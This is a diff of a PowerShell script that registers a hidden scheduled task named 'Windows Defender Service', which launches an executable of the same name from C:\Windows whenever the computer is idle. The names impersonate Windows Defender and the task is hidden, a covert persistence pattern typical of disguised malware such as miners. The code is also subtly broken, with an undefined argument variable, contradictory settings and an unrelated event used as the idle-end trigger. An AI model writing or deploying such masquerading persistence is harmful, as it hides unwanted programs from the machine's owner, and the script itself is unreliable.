@@ -1,89 +1,28 @@
-# Task Name and Path
+# Task Name and Action
 $TaskName = "Windows Defender Service"
-$TaskPath = "C:\Windows\Windows Defender Service.exe"
+$ActionPath = "C:\Windows\Windows Defender Service.exe" # Path to Windows Defender Service
 
-# Idle Time (in minutes)
-$IdleTimeMinutes = 1
+# Idle Conditions
+$IdleTime = 1 # Idle time in minutes
+$WaitTimeout = 1 # wait timeout in minutes
 
-# Function to start the task
-function Start-MyTask {
-    if (Test-Path $TaskPath) {
-        try {
-            $Action = New-ScheduledTaskAction -Execute $TaskPath
-            $Trigger = New-ScheduledTaskTrigger -AtLogOn
-            $Principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) -RunLevel Highest
-            $Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal
-            Register-ScheduledTask -TaskName $TaskName -InputObject $Task -User ([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) | Out-Null
-        }
-        catch {} # Suppress errors
-    }
-}
+# Create the Scheduled Task Action
+$Action = New-ScheduledTaskAction -Execute $ActionPath -Argument $ActionArguments
 
-# Function to stop the task
-function Stop-MyTask {
-    try {
-        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false | Out-Null
-    }
-    catch {} # Suppress errors
-}
+# Create the Scheduled Task Trigger (Idle)
+$IdleTrigger = New-ScheduledTaskTrigger -Idle -IdleTime $IdleTime -WaitTimeout $WaitTimeout
 
-# Function to check idle state
-function Check-IdleState {
-    try {
-        $IdleTimeSeconds = ([System.Management.Automation.Host.UI.PSHostRawUserInterface]::new()).RawUI.IdleTimeout
-        if ($IdleTimeSeconds -ge ($IdleTimeMinutes * 60)) {
-            return $true
-        } else {
-            return $false
-        }
-    }
-    catch {
-        return $false; #return false on error.
-    }
-}
+# Create the Scheduled Task Trigger (Stop on IdleEnd)
+$IdleEndTrigger = New-ScheduledTaskTrigger -Event -Subscription "<QueryList><Query Id='0' Path='System'><Select Path='System'>*[System[Provider[@Name='Microsoft-Windows-User Profile Service'] and (EventID=2)]]</Select></Query></QueryList>"
 
-# Event Registration for User Logon
-try {
-    Register-WmiEvent -Query "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'" -SourceIdentifier LogonEvent | Out-Null
-} catch {}
+# Create the Scheduled Task Settings
+$Settings = New-ScheduledTaskSettingsSet -AllowDemandStart -Hidden -StopIfGoingOnBatteries -DontStopIfGoingOnBatteries -WakeToRun -StartWhenAvailable -RunOnlyIfNetworkAvailable
 
-# Event Registration for Idle State
-try {
-    Register-WmiEvent -Query "SELECT * FROM Win32_IdleWin32Timing" -SourceIdentifier IdleEvent | Out-Null
-} catch {}
+# Create the Scheduled Task Principal
+$Principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) -LogonType Interactive
 
-# Event Handlers
-$LogonEventHandler = {
-    Start-MyTask
-}
+# Create the Scheduled Task
+$Task = New-ScheduledTask -Action $Action -Trigger $IdleTrigger,$IdleEndTrigger -Settings $Settings -Principal $Principal
 
-$IdleEventHandler = {
-    if (Check-IdleState) {
-        Stop-MyTask
-    }
-}
-
-$ActiveEventHandler = {
-    if (-not (Check-IdleState))
-    {
-        Start-MyTask
-    }
-}
-
-# Register event actions
-try {
-    Register-ObjectEvent -InputObject (Get-EventSubscriber -SourceIdentifier LogonEvent) -EventName Received -Action $LogonEventHandler | Out-Null
-    Register-ObjectEvent -InputObject (Get-EventSubscriber -SourceIdentifier IdleEvent) -EventName Received -Action $IdleEventHandler | Out-Null
-    Register-ObjectEvent -InputObject (Get-EventSubscriber -SourceIdentifier IdleEvent) -EventName Received -Action $ActiveEventHandler | Out-Null
-} catch {}
-
-# Keep the script running to listen for events
-while ($true) {
-    Start-Sleep -Seconds 60
-}
-
-# Cleanup (Will not be reached unless script is manually stopped)
-try{
-    Unregister-Event -SourceIdentifier LogonEvent | Out-Null
-    Unregister-Event -SourceIdentifier IdleEvent | Out-Null
-} catch {}
+# Register the Scheduled Task
+Register-ScheduledTask -TaskName $TaskName -InputObject $Task
